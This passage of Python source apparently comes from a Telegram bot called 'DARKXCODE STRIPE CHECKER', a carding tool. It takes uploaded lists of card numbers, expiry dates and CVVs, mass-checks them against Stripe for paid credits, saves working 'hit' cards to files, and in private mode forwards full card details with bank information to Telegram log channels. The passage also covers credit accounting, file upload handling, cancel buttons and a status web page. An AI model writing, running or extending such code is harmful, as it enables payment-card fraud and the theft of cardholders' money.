    user = await get_user(user_id)

    # Check if user has enough credits
    if user["credits"] < len(cards):
        await query.edit_message_text(
            f"*💰 INSUFFICIENT CREDITS*\n"
            f"══════════════════════\n"
            f"*Cards to check:* {len(cards)}\n"
            f"*Credits needed:* {len(cards)}\n"
            f"*Your credits:* {user['credits']}\n\n"
            f"You need {len(cards) - user['credits']} more credits.",
            parse_mode=ParseMode.MARKDOWN)
        return

    # Create cancel button
    keyboard = [[
        InlineKeyboardButton("🛑 CANCEL CHECK",
                             callback_data=f"cancel_check_{user_id}")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_msg = await query.edit_message_text(
        f"*🚀 MASS CHECK STARTED*\n"
        f"══════════════════════\n"
        f"*Total Cards:* {len(cards)}\n"
        f"*Your Credits:* {user['credits']}\n"
        f"*Status:* ⚡ Processing Cards...\n\n"
        f"*Live Results:* Starting...\n"
        f"══════════════════════\n"
        f"🔥 Charge: 0\n"
        f"❌ Declined: 0\n"
        f"⏳ Processed: 0/{len(cards)}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup)

    # Store task
    task = asyncio.create_task(
        mass_check_task_ultrafast(user_id, cards, status_msg,
                                  query.message.chat_id, context))
    checking_tasks[user_id] = {
        "task": task,
        "cancelled": False,
        "cards_processed": 0,
        "total_cards": len(cards),
        "chat_id": query.message.chat_id,
        "message_id": query.message.message_id,
        "start_time": time.time(),
        "approved": 0,
        "declined": 0
    }

    # Cleanup file storage
    if user_id in files_storage:
        del files_storage[user_id]


async def cancel_check_callback(update: Update,
                                context: ContextTypes.DEFAULT_TYPE):
    """Handle cancel check button"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    if query.data.startswith("cancel_check_"):
        try:
            user_id = int(query.data.split("_")[2])
        except:
            try:
                await query.answer("Invalid request", show_alert=True)
            except:
                pass
            return

        if user_id in checking_tasks:
            checking_tasks[user_id]["cancelled"] = True

            # Calculate used credits based on actual processing
            processed = checking_tasks[user_id]["cards_processed"]
            approved = checking_tasks[user_id].get("approved", 0)
            declined = checking_tasks[user_id].get("declined", 0)

            user = await get_user(user_id)
            used_credits = approved + declined  # Only actual checks count

            # Update user credits
            updates = {
                'credits': user["credits"] - used_credits,
                'credits_spent': user.get("credits_spent", 0) + used_credits,
                'checks_today': user.get("checks_today", 0) + processed,
                'total_checks': user["total_checks"] + processed,
                'approved_cards': user.get("approved_cards", 0) + approved,
                'declined_cards': user.get("declined_cards", 0) + declined,
                'last_check_date': datetime.datetime.now().date().isoformat()
            }
            await update_user(user_id, updates)

            # Update bot statistics
            await update_bot_stats({
                'total_checks': processed,
                'total_credits_used': used_credits,
                'total_approved': approved,
                'total_declined': declined
            })

            # Refresh user data
            user = await get_user(user_id)

            success_rate = (approved / processed * 100) if processed > 0 else 0

            await query.edit_message_text(
                f"*🛑 CHECK CANCELLED*\n"
                f"══════════════════════\n"
                f"*Results:*\n"
                f"• Processed: {processed} cards\n"
                f"• 🔥 Charge: {approved}\n"
                f"• ❌ Declined: {declined}\n"
                f"• Credits Used: {used_credits}\n"
                f"• Success Rate: {success_rate:.1f}%\n\n"
                f"*New Balance:* {user['credits']} credits",
                parse_mode=ParseMode.MARKDOWN)

            if user_id in checking_tasks:
                del checking_tasks[user_id]
        else:
            try:
                await query.answer("No active check found", show_alert=True)
            except:
                pass

def log_file_upload(user_id: int, username: str, filename: str, card_count: int):
    """Log file upload activity"""
    try:
        # FIXED: Use datetime.datetime.now()
        log_entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "user_id": user_id,
            "username": username,
            "filename": filename,
            "card_count": card_count
        }
        
        # Save to user log
        user_log_file = f"{USER_LOGS_FOLDER}/{user_id}.json"
        logs = []
        
        if os.path.exists(user_log_file):
            with open(user_log_file, 'r', encoding='utf-8') as f:
                try:
                    logs = json.load(f)
                except:
                    logs = []
        
        logs.append(log_entry)
        
        # Keep only last 100 entries
        if len(logs) > 100:
            logs = logs[-100:]
        
        with open(user_log_file, 'w', encoding='utf-8') as f:
            json.dump(logs, f, indent=2, ensure_ascii=False)
            
    except Exception as e:
        logger.error(f"Error logging file upload: {e}")

def save_hit_card(user_id: int, card: str, status: str, is_private: bool = False):
    """Save hit card to appropriate folder"""
    try:
        if status not in ["approved", "live"]:
            return
        
        # Determine folder
        folder = PRIVATE_HITS_FOLDER if is_private else PUBLIC_HITS_FOLDER
        Path(folder).mkdir(exist_ok=True)
        
        # FIXED: Use datetime.datetime.now() or time for filename
        date_str = datetime.datetime.now().strftime("%Y%m%d")
        filename = f"{folder}/{user_id}_{date_str}_{status}.txt"
        
        # Append card to file
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{card}\n")
            
    except Exception as e:
        logger.error(f"Error saving hit card: {e}")

async def send_to_log_channel(context, card: str, status: str, username: str, is_private: bool = False):
    """Send hit card to appropriate log channel with proper formatting"""
    if not is_private:
        return
    
    try:
        # Parse card data
        parts = card.split("|")
        if len(parts) < 4:
            return
            
        cc, mon, year, cvv = parts[:4]
        cc_clean = cc.replace(" ", "")
        
        # Get BIN info
        bin_info = get_bin_info(cc_clean[:6])
        bank_name = bin_info.get('bank', 'Unknown')[:30]  # Truncate long bank names
        country = bin_info.get('country', 'Unknown')
        
        # Current time
        current_time = datetime.datetime.now().strftime('%H:%M:%S')
        
        # SAFE FORMATTING: Use HTML to avoid markdown parsing issues
        if status == "approved" and APPROVED_LOG_CHANNEL:
            message = f"""
[↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
- - - - - - - - - - - - - - - - - - - - - -
[↯] Bin Info:-
[↯] Bank: {escape_html(bin_info['bank'])}
[↯] Country: {bin_info['country']} {bin_info['country_flag']}
- - - - - - - - - - - - - - - - - - - - - -
[↯] User : @{escape_html(username or 'N/A')}
[↯] Made By: @ISHANT_OFFICIAL
[↯] Bot: @DARKXCODE_STRIPE_BOT
"""
            
            await context.bot.send_message(
                chat_id=APPROVED_LOG_CHANNEL,
                text=message,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
            
        elif status == "live" and LIVE_LOG_CHANNEL:
            message = f"""
[↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
- - - - - - - - - - - - - - - - - - - - - -
[↯] Bin Info:-
[↯] Bank: {escape_html(bin_info['bank'])}
[↯] Country: {bin_info['country']} {bin_info['country_flag']}
- - - - - - - - - - - - - - - - - - - - - -
[↯] User : @{escape_html(username or 'N/A')}
[↯] Made By: @ISHANT_OFFICIAL
[↯] Bot: @DARKXCODE_STRIPE_BOT
"""
            
            await context.bot.send_message(
                chat_id=LIVE_LOG_CHANNEL,
                text=message,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
            
    except Exception as e:
        logger.error(f"Error sending to log channel: {e}")

async def handle_file_upload_message(update: Update,
                                     context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload messages for both public and private checks - FIXED"""
    if not update.message or not update.message.document:
        return

    user_id = update.effective_user.id
    file = update.message.document
    username = update.effective_user.username or f"user_{user_id}"

    # Check if file is TXT
    if not file.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Please upload only .txt files")
        return

    try:
        # Get file object
        file_obj = await file.get_file()
        
        # Download file to bytes - CORRECT METHOD
        file_content_bytes = await file_obj.download_as_bytearray()
        
        # Decode content
        try:
            file_content = file_content_bytes.decode('utf-8', errors='ignore')
        except UnicodeDecodeError:
            # Try different encodings
            for encoding in ['latin-1', 'cp1252', 'iso-8859-1']:
                try:
                    file_content = file_content_bytes.decode(encoding, errors='ignore')
                    break
                except:
                    continue
            else:
                # Last resort
                file_content = file_content_bytes.decode('utf-8', errors='replace')
        
        # Count cards
        cards = [line.strip() for line in file_content.split('\n') if line.strip()]
        valid_cards = []
        
        # Simple format check
        for card in cards:
            card = card.strip()
            if "|" in card and len(card.split("|")) >= 4:
                # Basic validation
                parts = card.split("|")
                if len(parts[0]) >= 13 and parts[0].replace(" ", "").isdigit():
                    valid_cards.append(card)
        
        if len(valid_cards) == 0:
            await update.message.reply_text(
                "❌ No valid cards found in file\n"
                "Format: cc|mm|yy|cvv (one per line)")
            return

        # Generate unique file ID
        random_chars = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
        file_id = f"{user_id}_{random_chars}"
        
        # Save to received folder
        received_filename = f"{RECEIVED_FOLDER}/{file_id}.txt"
        with open(received_filename, 'w', encoding='utf-8') as f:
            f.write(file_content)
        
        # Store file info
        files_storage[user_id] = {
            "file_id": file_id,
            "received_file": received_filename,
            "username": username,
            "total_cards": len(valid_cards),
            "cards": valid_cards,
            "timestamp": time.time(),
            "original_filename": file.file_name
        }
        
        # Log file upload
        log_file_upload(user_id, username, file.file_name, len(valid_cards))
        
        # Create response with buttons
        keyboard = [
            [
                InlineKeyboardButton("⚡ Public Check (/mchk)", callback_data="start_public_mass"),
                InlineKeyboardButton("🔒 Private Check (/pmchk)", callback_data="start_private_mass")
            ],
            [
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_upload")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ <b>File Received</b>\n"
            f"══════════════════════\n"
            f"<b>Filename:</b> <code>{file.file_name}</code>\n"
            f"<b>Valid cards:</b> {len(valid_cards)}\n"
            f"<b>File ID:</b> <code>{file_id}</code>\n\n"
            f"<b>Choose check type:</b>\n"
            f"• <b>⚡ Public Check</b> - Results shown only to you\n"
            f"• <b>🔒 Private Check</b> - Hits forwarded to channels\n\n"
            f"<b>Or use commands:</b>\n"
            f"<code>/mchk</code> - Public mass check\n"
            f"<code>/pmchk</code> - Private mass check",
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )

    except Exception as e:
        logger.error(f"Error handling file upload: {e}")
        await update.message.reply_text(
            f"❌ Error processing file: {str(e)[:100]}",
            parse_mode=ParseMode.HTML
        )

async def start_public_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start public mass check from callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    
    # Call the mchk_command function
    await query.edit_message_text("Starting public mass check...")
    
    # Create a fake message to pass to mchk_command
    fake_update = Update(
        update_id=update.update_id,
        message=query.message,
        callback_query=query
    )
    
    # Clear any args to trigger the normal flow
    context.args = []
    
    await mchk_command(fake_update, context)

async def start_private_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start private mass check from callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    
    # Call the pmchk_command function
    await query.edit_message_text("Starting private mass check...")
    
    # Create a fake message
    fake_update = Update(
        update_id=update.update_id,
        message=query.message,
        callback_query=query
    )
    
    # Clear any args
    context.args = []
    
    await pmchk_command(fake_update, context)

async def cancel_upload_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel file upload"""
    query = update.callback_query
    
    try:
        await query.answer("Upload cancelled")
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    
    # Remove stored file
    if user_id in files_storage:
        file_info = files_storage[user_id]
        try:
            if os.path.exists(file_info["received_file"]):
                os.remove(file_info["received_file"])
        except:
            pass
        del files_storage[user_id]
    
    await query.edit_message_text(
        "❌ <b>File Upload Cancelled</b>\n"
        "The uploaded file has been removed.\n"
        "You can upload a new file anytime.",
        parse_mode=ParseMode.HTML
    )

async def download_telegram_file(file_id: str, bot) -> bytes:
    """Download file from Telegram using correct API"""
    try:
        # Get file path
        file = await bot.get_file(file_id)
        # Download to bytes
        file_bytes = await file.download_as_bytearray()
        return file_bytes
    except Exception as e:
        logger.error(f"Error downloading file {file_id}: {e}")
        raise

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors gracefully"""
    error_msg = str(context.error) if context.error else "Unknown error"
    logger.error(f"Exception: {error_msg}")

    # Ignore common non-critical errors
    if "Message is not modified" in error_msg:
        return
    if "Query is too old" in error_msg:
        return

    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "*⚠️ SYSTEM ERROR*\n"
                "An error occurred. Please try again.\n"
                "If problem persists, contact admin.",
                parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"Error in error handler: {e}")


async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle unknown commands"""
    await update.message.reply_text(
        "*❌ Invalid Command*\n\n"
        "Use `/help` to see available commands.",
        parse_mode=ParseMode.MARKDOWN)


class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>⚡ DARKXCODE STRIPE CHECKER ⚡</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {{
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        color: white;
                        text-align: center;
                        padding: 50px;
                        margin: 0;
                        min-height: 100vh;
                        display: flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                    }}
                    .container {{
                        background: rgba(0, 0, 0, 0.7);
                        padding: 40px;
                        border-radius: 20px;
                        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                        max-width: 800px;
                        width: 90%;
                        backdrop-filter: blur(10px);
                    }}
                    h1 {{
                        font-size: 2.5em;
                        margin-bottom: 20px;
                        color: #00ff88;
                        text-shadow: 0 0 10px #00ff88;
                    }}
                    .status {{
                        font-size: 1.5em;
                        margin: 20px 0;
                        padding: 15px;
                        background: rgba(0, 255, 136, 0.1);
                        border-radius: 10px;
                        border: 2px solid #00ff88;
                    }}
                    .info-box {{
                        background: rgba(255, 255, 255, 0.1);
                        padding: 20px;
                        border-radius: 10px;
                        margin: 15px 0;
                        text-align: left;
                    }}
                    .telegram-btn {{
                        display: inline-block;
                        background: #0088cc;
                        color: white;
                        padding: 15px 30px;
                        border-radius: 25px;
                        text-decoration: none;
                        font-weight: bold;
                        margin-top: 20px;
                        transition: all 0.3s;
                    }}
                    .telegram-btn:hover {{
                        background: #006699;
                        transform: scale(1.05);
                    }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>⚡ DARKXCODE STRIPE CHECKER ⚡</h1>
                    <div class="status">✅ BOT IS ONLINE & RUNNING</div>
                    <div class="info-box">
                        <h3>🤖 Bot Status</h3>
                        <p><strong>Version:</strong> v2.0</p>
                        <p><strong>Port:</strong> {port}</p>
                        <p><strong>Status:</strong> Active</p>
                    </div>
                    <a href="https://t.me/DarkXCode" class="telegram-btn" target="_blank">
                        📲 Contact on Telegram
                    </a>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        elif self.path == '/health':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            response = {{
                "status": "online",
                "service": "darkxcode-stripe-checker",
                "version": "2.0",
                "timestamp": datetime.datetime.now().isoformat()
            }}
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass


def start_health_server():
    """Start health server on first available port"""
    port = int(os.environ.get('PORT', 8080))
    max_attempts = 5
    
    for attempt in range(max_attempts):
        current_port = port + attempt
        try:
            server = HTTPServer(('0.0.0.0', current_port), HealthHandler)
            print(f"🌐 Health server started on port {current_port}")
            print(f"🔗 Web interface: http://localhost:{current_port}")
            print(f"🔗 Health check: http://localhost:{current_port}/health")
            server.serve_forever()
            break
        except OSError as e:
            if "Address already in use" in str(e) and attempt < max_attempts - 1:
                print(f"⚠️  Port {current_port} in use, trying {current_port + 1}")
                continue
            else:
                print(f"⚠️  Could not start health server: {e}")
                break


async def main():
    """Start the bot"""
    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")
    
    # Skip health server if port is busy
    print("⚠️  Health server port busy, continuing without web interface")
    print("⚠️  Bot functionality remains unaffected")

    if not firebase_connected:
        print("⚠️  Using in-memory storage instead")
        print("⚠️  NOTE: Data will be lost when bot restarts!")
    else:
        print("✅ Firebase connected successfully")

    # Start health server in a separate thread with retry logic
    health_thread = threading.Thread(target=start_health_server, daemon=True)
    health_thread.start()
    
    # Give health server a moment to start
    await asyncio.sleep(1)

    # Create application
    application = Application.builder().token(BOT_TOKEN).build()

    # Add error handler
    application.add_error_handler(error_handler)

    # ========== COMMAND HANDLERS ==========
    # Public commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("credits", credits_command))
    application.add_handler(CommandHandler("invite", invite_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("pchk", pchk_command))
    application.add_handler(CommandHandler("pmchk", pmchk_command))
    application.add_handler(CommandHandler("claim", claim_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("help", help_command))

    # Admin commands
    application.add_handler(CommandHandler("botinfo", botinfo_command))
    application.add_handler(CommandHandler("userinfo", userinfo_command))
    application.add_handler(CommandHandler("addcr", addcr_command))
    application.add_handler(CommandHandler("gengift", gengift_command))
    application.add_handler(CommandHandler("listgifts", listgifts_command))

    # ========== MESSAGE HANDLERS ==========
    application.add_handler(
        MessageHandler(filters.Document.ALL, handle_file_upload_message))

    # ========== CALLBACK HANDLERS ==========
    application.add_handler(
        CallbackQueryHandler(verify_join_callback, pattern="^verify_join$"))
    application.add_handler(
        CallbackQueryHandler(back_to_start_callback,
                             pattern="^back_to_start$"))
    application.add_handler(
        CallbackQueryHandler(quick_check_callback, pattern="^quick_check$"))
    application.add_handler(
        CallbackQueryHandler(mass_check_callback, pattern="^mass_check$"))
    application.add_handler(
        CallbackQueryHandler(my_credits_callback, pattern="^my_credits$"))
    application.add_handler(
        CallbackQueryHandler(invite_callback, pattern="^invite$"))
    application.add_handler(
        CallbackQueryHandler(copy_invite_callback, pattern="^copy_invite$"))
    application.add_handler(
        CallbackQueryHandler(admin_panel_callback, pattern="^admin_panel$"))
    application.add_handler(
        CallbackQueryHandler(claim_gift_callback, pattern="^claim_gift$"))
    application.add_handler(
        CallbackQueryHandler(start_mass_check_callback,
                             pattern="^start_mass_"))
    application.add_handler(
        CallbackQueryHandler(cancel_check_callback, pattern="^cancel_check_"))
    application.add_handler(
        CallbackQueryHandler(cancel_mass_callback, pattern="^cancel_mass$"))
    application.add_handler(
        CallbackQueryHandler(start_public_mass_callback, pattern="^start_public_mass$"))
    application.add_handler(
        CallbackQueryHandler(start_private_mass_callback, pattern="^start_private_mass$"))
    application.add_handler(
        CallbackQueryHandler(cancel_upload_callback, pattern="^cancel_upload$"))
    application.add_handler(
        CallbackQueryHandler(lambda u, c: u.callback_query.answer("Upload a .txt file"), 
                        pattern="^upload_help$"))

    # Admin panel callbacks
    application.add_handler(
        CallbackQueryHandler(admin_addcr_callback, pattern="^admin_addcr$"))
    application.add_handler(
        CallbackQueryHandler(admin_gengift_callback,
                             pattern="^admin_gengift$"))
    application.add_handler(
        CallbackQueryHandler(admin_listgifts_callback,
                             pattern="^admin_listgifts$"))
    application.add_handler(
        CallbackQueryHandler(admin_userinfo_callback,
                             pattern="^admin_userinfo$"))
    application.add_handler(
        CallbackQueryHandler(admin_botinfo_callback,
                             pattern="^admin_botinfo$"))

    # ========== UNKNOWN COMMAND HANDLER ==========
    application.add_handler(MessageHandler(filters.COMMAND, unknown_command))

    # Start bot
    print(f"📍 Address Rotation: Enabled (US, UK, CA, IN, AU)")
    print(f"🤝 Invite & Earn: 100 credits per referral")
    print(f"📊 Database: {'✅ Connected' if firebase_connected else '⚠️ In-memory'}")
    print(f"🔐 Admin Commands: {len(ADMIN_IDS)} admin(s)")
    print("✅ Bot is running...")

    # Start polling
    await application.initialize()
    await application.start()
    await application.updater.start_polling()

    # Keep the bot running
    while True:
        await asyncio.sleep(3600)


def start_bot():
    """Start the bot for Pydroid 3 compatibility"""
    try:
        # Create a new event loop for Pydroid
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        # Run the bot
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")

    # For Render.com compatibility
    port = int(os.environ.get('PORT', 8080))
    print(f"🌐 Starting on port: {port}")

    start_bot()
